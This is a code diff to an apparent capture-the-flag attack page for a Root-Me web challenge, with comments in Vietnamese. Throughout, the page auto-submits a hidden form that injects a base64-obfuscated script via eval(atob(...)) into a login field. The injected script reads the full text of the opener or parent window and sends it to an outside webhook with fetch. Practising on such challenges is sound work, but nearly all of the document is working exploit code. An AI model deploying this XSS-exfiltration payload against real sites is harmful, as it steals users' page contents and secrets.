@@ -10,31 +10,31 @@
         const CHALLENGE_URL = 'http://challenge01.root-me.org:58003/login';
 
         /**
-         * PAYLOAD XSS SỬ DỤNG OPENER:
-         * Script này sẽ kiểm tra xem cửa sổ đã mở ra nó (opener) có nội dung gì không.
+         * PAYLOAD XSS: Viết dưới dạng chuỗi tối giản
          */
         const xssCode = `
             try {
-                if (window.opener && window.opener !== window) {
-                    // Lấy toàn bộ nội dung text của tab cha
-                    var secret = window.opener.document.documentElement.innerText;
-                    fetch('${WEBHOOK_URL}?flag=' + btoa(secret));
+                var target = window.opener || window.parent;
+                if (target && target !== window) {
+                    var secret = target.document.documentElement.innerText;
+                    fetch('${WEBHOOK_URL}?flag=' + btoa(unescape(encodeURIComponent(secret))));
                 } else {
-                    // Nếu không có opener, thử kiểm tra cấp độ cao hơn (top)
-                    var secretAlt = window.top.opener.document.documentElement.innerText;
-                    fetch('${WEBHOOK_URL}?flag_alt=' + btoa(secretAlt));
+                    fetch('${WEBHOOK_URL}?err=no_opener');
                 }
             } catch(e) {
-                fetch('${WEBHOOK_URL}?error=' + btoa(e.message));
+                fetch('${WEBHOOK_URL}?err=' + btoa(e.message));
             }
-        `;
+        `.trim();
 
-        // Mã hóa Base64 để tránh lỗi SyntaxError dấu ngoặc nhọn
-        const encodedXSS = btoa(xssCode.trim());
+        // Hàm mã hóa Base64 hỗ trợ Unicode/Ký tự đặc biệt
+        function safeBtoa(str) {
+            return btoa(unescape(encodeURIComponent(str)));
+        }
+
+        const encodedXSS = safeBtoa(xssCode);
 
         /**
-         * THỰC THI:
-         * POST payload vào username.
+         * THỰC THI: Gửi POST payload
          */
         const form = document.createElement('form');
         form.method = 'POST';
@@ -44,13 +44,13 @@
         input.type = 'hidden';
         input.name = 'username';
         
-        // Payload eval(atob(...)) để thực thi an toàn trên domain challenge
-        input.value = `<script>eval(atob('${encodedXSS}'))<\/script>`;
+        // Payload eval(atob(...))
+        input.value = "<script>eval(atob('" + encodedXSS + "'))<\/script>";
 
         form.appendChild(input);
         document.body.appendChild(form);
 
-        // Tự động kích hoạt khi Bot vào trang Vercel
+        // Kích hoạt
         form.submit();
     </script>
 </body>
